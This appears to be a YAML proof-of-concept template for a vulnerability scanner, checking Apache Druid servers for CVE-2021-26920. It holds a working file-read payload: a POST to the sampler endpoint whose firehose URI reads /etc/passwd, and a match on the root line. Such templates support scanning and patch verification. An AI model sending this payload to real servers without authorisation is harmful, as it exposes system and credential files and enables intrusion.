name: poc-yaml-druid-cve-2021-26920-file-read
binding: a387f19f-17f7-4930-926f-d6ab7454dc0b
manual: true
detail:
    author: Raiynin
    links:
        - https://www.cnblogs.com/cn-gov/p/15572281.html
    vulnerability:
        id: CT-155504
        level: medium
    Affected Version: Version < 0.21
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /druid/indexer/v1/sampler?for=connect
            headers:
                Content-Type: application/json
            body: |
                {"type": "index", "spec": {"type": "index", "ioConfig": {"type": "index", "firehose": {"type": "http", "uris": ["file:///etc/passwd"]}}, "dataSchema": {"dataSource": "sample", "parser": {"type": "string", "parseSpec": {"format": "regex", "pattern": "(.*)", "columns": ["a"], "dimensionsSpec": {}, "timestampSpec": {"column": "!!!_no_such_column_!!!", "missingValue": "2010-01-01T00:00:00Z"}}}}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
expression: r0()
